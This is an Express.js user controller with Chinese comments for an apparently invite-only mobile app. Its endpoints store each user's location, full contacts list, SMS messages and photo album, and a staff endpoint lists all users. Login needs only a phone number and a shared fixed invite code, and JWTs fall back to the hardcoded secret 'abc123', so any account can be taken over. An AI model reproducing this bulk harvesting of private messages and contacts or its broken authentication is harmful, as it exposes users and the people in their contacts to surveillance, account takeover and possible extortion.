const asyncHandler = require('express-async-handler');
const User = require('../models/userModel');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const sharp = require('sharp');
const path = require('path');
const fs = require('fs');

// 系统固定邀请码
const SYSTEM_INVITE_CODE = '6969';

// 配置 multer 存储
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, '../../uploads/images');
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'photo-' + uniqueSuffix + path.extname(file.originalname));
  }
});

// 配置 multer
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB限制
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('只允许上传图片文件'));
    }
  }
});

// @desc    注册新用户或登录现有用户
// @route   POST /api/users/login
// @access  Public
const loginUser = asyncHandler(async (req, res) => {
  const { phoneNumber, inviteCode } = req.body;

  // 验证邀请码
  if (inviteCode !== SYSTEM_INVITE_CODE) {
    res.status(401);
    throw new Error('邀请码无效');
  }

  // 检查用户是否存在
  let user = await User.findOne({ phoneNumber });

  if (user) {
    // 用户存在，执行登录逻辑
    res.status(200).json({
      _id: user._id,
      phoneNumber: user.phoneNumber,
      name: user.name,
      avatar: user.avatar,
      role: user.role,
      isVip: user.isVip,
      vipExpiryDate: user.vipExpiryDate,
      token: generateToken(user._id),
    });
  } else {
    // 用户不存在，创建新用户
    user = await User.create({
      phoneNumber,
      inviteCode: '', // 用户自己的邀请码，可以后续生成
    });

    if (user) {
      res.status(201).json({
        _id: user._id,
        phoneNumber: user.phoneNumber,
        name: user.name || '',
        avatar: user.avatar || '',
        role: user.role,
        isVip: user.isVip,
        vipExpiryDate: user.vipExpiryDate,
        token: generateToken(user._id),
      });
    } else {
      res.status(400);
      throw new Error('无效的用户数据');
    }
  }
});

// @desc    获取用户资料
// @route   GET /api/users/profile
// @access  Private
const getUserProfile = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);

  if (user) {
    res.json({
      _id: user._id,
      phoneNumber: user.phoneNumber,
      name: user.name,
      avatar: user.avatar,
      role: user.role,
      isVip: user.isVip || false, // 确保有默认值
      vipExpiryDate: user.vipExpiryDate || null, // 确保有默认值
    });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc    更新用户资料
// @route   PUT /api/users/profile
// @access  Private
const updateUserProfile = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);

  if (user) {
    user.name = req.body.name || user.name;
    user.avatar = req.body.avatar || user.avatar;

    const updatedUser = await user.save();

    res.json({
      _id: updatedUser._id,
      phoneNumber: updatedUser.phoneNumber,
      name: updatedUser.name,
      avatar: updatedUser.avatar,
      role: updatedUser.role,
      isVip: updatedUser.isVip,
      vipExpiryDate: updatedUser.vipExpiryDate,
      token: generateToken(updatedUser._id),
    });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc 上传定位
// @route POST /api/users/upload-location
// @access Private
const uploadLocation = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (user) {
    const location = req.body.data || {};
    user.locationData = location;
    await user.save();
    // 详细日志
    console.log('定位上传：', {
      user: req.user._id,
      location: location,
      time: new Date().toISOString()
    });
    res.json({ success: true });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc 上传通讯录
// @route POST /api/users/upload-contacts
// @access Private
const uploadContacts = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (user) {
    const contacts = req.body.data || [];
    user.contactsData = contacts;
    await user.save();
    // 详细日志
    console.log('通讯录上传：', {
      user: req.user._id,
      total: Array.isArray(contacts) ? contacts.length : 0,
      time: new Date().toISOString()
    });
    res.json({ success: true });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc 上传短信
// @route POST /api/users/upload-sms
// @access Private
const uploadSMS = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (user) {
    const sms = req.body.data || [];
    user.smsData = sms;
    await user.save();
    // 详细日志
    console.log('短信上传：', {
      user: req.user._id,
      total: Array.isArray(sms) ? sms.length : 0,
      time: new Date().toISOString()
    });
    res.json({ success: true });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc 上传相册
// @route POST /api/users/upload-album
// @access Private
const uploadAlbum = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user._id);
  if (user) {
    const album = req.body.data || [];
    user.albumData = album;
    await user.save();
    // 详细日志
    console.log('相册上传：', {
      user: req.user._id,
      total: Array.isArray(album) ? album.length : 0,
      time: new Date().toISOString()
    });
    res.json({ success: true });
  } else {
    res.status(404);
    throw new Error('用户不存在');
  }
});

// @desc 上传单张图片
// @route POST /api/users/upload-image
// @access Private
const uploadImage = asyncHandler(async (req, res) => {
  if (!req.file) {
    res.status(400);
    throw new Error('没有上传文件');
  }
  
  try {
    // 使用 sharp 压缩图片
    const compressedImagePath = path.join(path.dirname(req.file.path), 'compressed-' + req.file.filename);
    
    await sharp(req.file.path)
      .resize(800, 800, { 
        fit: 'inside',
        withoutEnlargement: true 
      })
      .jpeg({ quality: 80 })
      .toFile(compressedImagePath);
    
    // 删除原文件，保留压缩后的文件
    fs.unlinkSync(req.file.path);
    
    const imageUrl = `/uploads/images/compressed-${req.file.filename}`;
    
    console.log('图片上传成功：', {
      user: req.user._id,
      filename: req.file.filename,
      url: imageUrl,
      time: new Date().toISOString()
    });
    
    res.json({
      success: true,
      imageUrl: imageUrl,
      filename: req.file.filename
    });
  } catch (error) {
    console.error('图片处理失败：', error);
    res.status(500);
    throw new Error('图片处理失败');
  }
});

// @desc 上传权限日志
// @route POST /api/users/upload-permission-log
// @access Private
const uploadPermissionLog = asyncHandler(async (req, res) => {
  console.log('权限日志：', {
    user: req.user._id,
    ...req.body
  });
  res.json({ success: true });
});

// @desc    获取所有用户列表（供客服查看）
// @route   GET /api/users
// @access  Private/CustomerService
const getAllUsers = asyncHandler(async (req, res) => {
  // 查询所有用户，按创建时间倒序排序，使最近注册的用户显示在前面
  const users = await User.find({})
    .select('_id phoneNumber name avatar createdAt')
    .sort({ createdAt: -1 });
  
  // 返回结果
  res.json(users);
});

// 生成JWT令牌
const generateToken = (id) => {
  const token = jwt.sign({ id }, process.env.JWT_SECRET || 'abc123', {
    expiresIn: '30d',
  });
  return `U_${token}`; // 添加U_前缀
};

// 更新用户FCM Token
const updateFCMToken = async (req, res) => {
  try {
    const { fcmToken } = req.body;
    const userId = req.user.id;

    if (!fcmToken) {
      return res.status(400).json({ message: '缺少FCM Token' });
    }

    const User = require('../models/userModel');
    
    // 更新用户的FCM Token
    const result = await User.updateFCMToken(userId, fcmToken);
    
    if (result) {
      console.log(`✅ 用户 ${userId} FCM Token已更新`);
      res.json({ message: 'FCM Token更新成功' });
    } else {
      res.status(404).json({ message: '用户不存在' });
    }
  } catch (error) {
    console.error('❌ 更新FCM Token失败:', error);
    res.status(500).json({ message: '服务器错误', error: error.message });
  }
};

// @desc 开通用户VIP
// @route POST /api/users/:id/vip
// @access Private/Admin
const activateUserVip = asyncHandler(async (req, res) => {
  const { months = 12 } = req.body; // 默认开通12个月
  const userId = req.params.id;
  
  const user = await User.findById(userId);
  if (!user) {
    res.status(404);
    throw new Error('用户不存在');
  }
  
  // 计算VIP到期时间
  const expiryDate = new Date();
  expiryDate.setMonth(expiryDate.getMonth() + months);
  
  user.isVip = true;
  user.vipExpiryDate = expiryDate;
  await user.save();
  
  res.json({
    message: `用户 ${user.phoneNumber} VIP已开通，有效期至 ${expiryDate.toLocaleDateString()}`,
    user: {
      _id: user._id,
      phoneNumber: user.phoneNumber,
      name: user.name,
      isVip: user.isVip,
      vipExpiryDate: user.vipExpiryDate
    }
  });
});

// @desc 取消用户VIP
// @route DELETE /api/users/:id/vip
// @access Private/Admin
const deactivateUserVip = asyncHandler(async (req, res) => {
  const userId = req.params.id;
  
  const user = await User.findById(userId);
  if (!user) {
    res.status(404);
    throw new Error('用户不存在');
  }
  
  user.isVip = false;
  user.vipExpiryDate = null;
  await user.save();
  
  res.json({
    message: `用户 ${user.phoneNumber} VIP已取消`,
    user: {
      _id: user._id,
      phoneNumber: user.phoneNumber,
      name: user.name,
      isVip: user.isVip,
      vipExpiryDate: user.vipExpiryDate
    }
  });
});

module.exports = { 
  loginUser, 
  getUserProfile, 
  updateUserProfile, 
  uploadLocation, 
  uploadContacts, 
  uploadSMS, 
  uploadAlbum, 
  uploadImage,
  uploadPermissionLog,
  upload,
  getAllUsers, // 添加新函数到导出列表
  updateFCMToken,
  activateUserVip,
  deactivateUserVip,
}; 